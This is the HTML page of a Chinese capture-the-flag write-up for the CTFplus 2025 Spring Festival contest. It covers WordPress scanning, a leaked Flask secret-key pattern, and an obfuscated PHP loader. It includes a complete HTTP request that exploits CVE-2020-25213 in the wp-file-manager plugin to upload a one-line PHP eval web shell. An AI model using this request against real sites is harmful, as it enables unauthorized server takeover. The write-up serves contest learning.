@@ -1,0 +1,644 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>CTFplus2025新春挑战赛 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">入侵分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse-%E5%8A%A0%E5%AF%86%E8%BF%B7%E5%B1%80%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">reverse-加密迷局（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E5%B9%B4%E9%9A%90%E6%82%A3"><span class="toc-number">4.</span> <span class="toc-text">新年隐患</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%8C%91%E6%88%98"><span class="toc-number">5.</span> <span class="toc-text">提权挑战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc-%E6%97%B6%E5%85%89%E8%BF%BD%E6%BA%AF"><span class="toc-number">6.</span> <span class="toc-text">misc-时光追溯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc-%E6%95%B0%E6%8D%AE%E8%B6%B3%E8%BF%B9"><span class="toc-number">7.</span> <span class="toc-text">misc-数据足迹</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>CTFplus2025新春挑战赛</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/1/28
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/WordPress/" style="color: #00bcd4">WordPress</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.7k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>除夕打ctf ver3</p>
+<p>二进制的部分不会啦 _(:3 」∠ )_</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="入侵分析"><a href="#入侵分析" class="headerlink" title="入侵分析"></a>入侵分析</h1><p>wpscan 加 –force 参数开扫</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> robots.txt found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/robots.txt
+ <span class="token operator">|</span> Interesting Entry: /3ysd8.html
+ <span class="token operator">|</span> Found By: Robots Txt <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Confidence: <span class="token number">100</span>%
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress readme found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/readme.html
+ <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Confidence: <span class="token number">100</span>%
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Upload directory has listing enabled: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/wp-content/uploads/
+ <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Confidence: <span class="token number">100</span>%
+
+Fingerprinting the version - Time: 00:00:57 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">702</span> / <span class="token number">702</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:57
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The WordPress version could not be detected.
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
+ Checking Config Backups - Time: 00:00:01 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">137</span> / <span class="token number">137</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:01
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
+ <span class="token operator">|</span> Plan: <span class="token function">free</span>
+ <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">0</span>
+ <span class="token operator">|</span> Requests Remaining: <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>3ysd8.html</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>备忘录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>怕忘了，放这儿，应该没人知道吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- key是  app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>&#x2F;wp-content&#x2F;uploads&#x2F;2025&#x2F;01&#x2F; 下下载到源码</p>
+<p>只发现一个 wpfilemanager.php 比较令人在意，搜一下，有 CVE-2020-25213</p>
+<p>flag：<code>flag&#123;CVE-2020-25213_wp-file-manager&#125;</code></p>
+<p>传马</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">80-c1f4bf17-2a3c-4b73-a278-0c963f55036f.challenge.ctfplus.cn</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=72489tgmnn16aeuar248kim1g8</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
+<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">415</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarySkJwlzCQ52IPd8V5</span></span>
+
+------WebKitFormBoundarySkJwlzCQ52IPd8V5
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="cmd"</span></span>
+
+upload
+------WebKitFormBoundarySkJwlzCQ52IPd8V5
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="target"</span></span>
+
+l1_
+------WebKitFormBoundarySkJwlzCQ52IPd8V5
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="upload[]";filename="shell.php"</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>
+
+&lt;?php @eval($_POST[1]);?>
+------WebKitFormBoundarySkJwlzCQ52IPd8V5--
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128203719059.png" alt="image-20250128203719059"></p>
+<hr>
+<h1 id="reverse-加密迷局（Unsolved）"><a href="#reverse-加密迷局（Unsolved）" class="headerlink" title="reverse-加密迷局（Unsolved）"></a>reverse-加密迷局（Unsolved）</h1><p>蚁剑连上去</p>
+<p>发现同目录下config.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">rfHWEMTbes0uuYuHJczUCsS2ovroJHKWpYLixdKXtfqPqKWJudyRhqPatqjbjXX1raKshzfaivabqDzicra4yurenZqLgBvqcrqWfKPmu1uUfXaJqKGzDrafvKS4iqHaj0WerGKPfXfgdziEdveByvmUnYjchNXnrHC8aBznxGjEus8Olav8sZq2BBmPvXvwczfgs09wFfzrJGChDfnsuBavBauvqgfqDsOhBXBtwHGQiZqtiKBNpImYftvJga5na0WCfdKNhXngwIzPdDuxaL9sJdKIoxzFDG8ruvfvtXvvoLeDoLjQqtPtrqK2q0ztofvqqtPuAIXtvuCTxurlFLrqvYXwvw0SvLuolv1Ds35ruB4SvfCKlfeurY1erDT<span class="token operator">+</span>uvDElarxjcXvvDCTx0nlFLerhIXtvIqSu1yolv1ds35grGKyBqv8skCKnqKkv0f4paBuhuypJB8BqD1BaI8twDqjDH8BqgyDvriyiuPmphy3nYLqcrqZf0yevKOoJd1HB0yjBaKhFaTgsvrcxa8Mf1BxoKnquqBfuLDQrf5gjHvshkPsrL1HuD9wvL1Av1WvlHCqcKjilGqvaGmcqLCCs0rCuB8VJZ1qxrKvfIG0wK0qcqfqxfa0Ja8AvKTEotnMpuWeBfusmIBgdziEdveBc0Wru0D6vMLBoLBclqXBaN5su1CSvLqafLayJHrCdYyatampfDWAgIq1mtLruuaZEI4drH8sdZTqxrC8aBznxLXDw0yZusGniKjatBmdnGL0rf0DgsCtcLajfBKwsGXAcXmSfzyCrhq6izKpoDOWfuSqBqGfaDa<span class="token operator">/</span>gqOcazfJtBrYBZipvDydnrzDfqWrDvCyrcWxaLavDZ0CBuBmJBS<span class="token operator">+</span>i1TDxvaMDq0zuaKugrWJtfmJjIaKqsjaJXuiqDTrotfmvcLcrKOvuqzwmuBnJBS<span class="token operator">+</span>i1TDcriFauBNwvWiDr8dazHnfamulXqplGidqDz8DIukCDreJzG0oq5qcrqWfKP9e1imfLLm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>enc.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">goto</span> gocnm<span class="token punctuation">;</span>
+pyr9U<span class="token punctuation">:</span>
+<span class="token variable">$AeU4Z</span> <span class="token operator">=</span> <span class="token function">wxrm5</span><span class="token punctuation">(</span><span class="token variable">$ovA2n</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">goto</span> ZXC1s<span class="token punctuation">;</span>
+bRFpO<span class="token punctuation">:</span>
+<span class="token variable">$kqXHn</span> <span class="token operator">=</span> <span class="token function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$G3spL</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">goto</span> tDl1K<span class="token punctuation">;</span>
+mPUF3<span class="token punctuation">:</span>
+<span class="token variable">$G3spL</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">goto</span> bRFpO<span class="token punctuation">;</span>
+gocnm<span class="token punctuation">:</span>
+<span class="token keyword">function</span> <span class="token function-definition function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">,</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">goto</span> Te0pD<span class="token punctuation">;</span>
+    U_h6_<span class="token punctuation">:</span>
+    <span class="token keyword">goto</span> jAnQc<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> EUfZj<span class="token punctuation">;</span>
+    V51ce<span class="token punctuation">:</span>
+    rgswz<span class="token punctuation">:</span>
+    <span class="token keyword">goto</span> J8PqR<span class="token punctuation">;</span>
+    eOzRo<span class="token punctuation">:</span>
+    <span class="token variable">$hp_8p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> ZBeFr<span class="token punctuation">;</span>
+    ZBeFr<span class="token punctuation">:</span>
+    jAnQc<span class="token punctuation">:</span>
+    <span class="token keyword">goto</span> ka22G<span class="token punctuation">;</span>
+    dtEi1<span class="token punctuation">:</span>
+    <span class="token variable">$pdpKe</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$pcDaC</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span> <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> V51ce<span class="token punctuation">;</span>
+    MmYXr<span class="token punctuation">:</span>
+    <span class="token variable">$pcDaC</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> eOzRo<span class="token punctuation">;</span>
+    QbNa9<span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token variable">$pdpKe</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> Ju0hu<span class="token punctuation">;</span>
+    Te0pD<span class="token punctuation">:</span>
+    <span class="token variable">$pdpKe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> MmYXr<span class="token punctuation">;</span>
+    J8PqR<span class="token punctuation">:</span>
+    <span class="token variable">$hp_8p</span><span class="token operator">++</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> U_h6_<span class="token punctuation">;</span>
+    ka22G<span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$hp_8p</span> <span class="token operator">&lt;</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">goto</span> fcyLI<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">goto</span> dtEi1<span class="token punctuation">;</span>
+    EUfZj<span class="token punctuation">:</span>
+    fcyLI<span class="token punctuation">:</span>
+    <span class="token keyword">goto</span> QbNa9<span class="token punctuation">;</span>
+    Ju0hu<span class="token punctuation">:</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">goto</span> mPUF3<span class="token punctuation">;</span>
+tDl1K<span class="token punctuation">:</span>
+<span class="token variable">$ovA2n</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">goto</span> pyr9U<span class="token punctuation">;</span>
+ZXC1s<span class="token punctuation">:</span>
+<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$kqXHn</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$AeU4Z</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>$kqXHn geesecenc</p>
+<p>$AeU4Z config.php</p>
+<p>那么就是执行了<code>geesecenc(config.php)</code></p>
+<p>而 geesecenc 在so文件里</p>
+<hr>
+<h1 id="新年隐患"><a href="#新年隐患" class="headerlink" title="新年隐患"></a>新年隐患</h1><p>找一下可能的后门代码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins<span class="token punctuation">)</span> $ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token string">'eval('</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">--include</span><span class="token operator">=</span>*.php <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
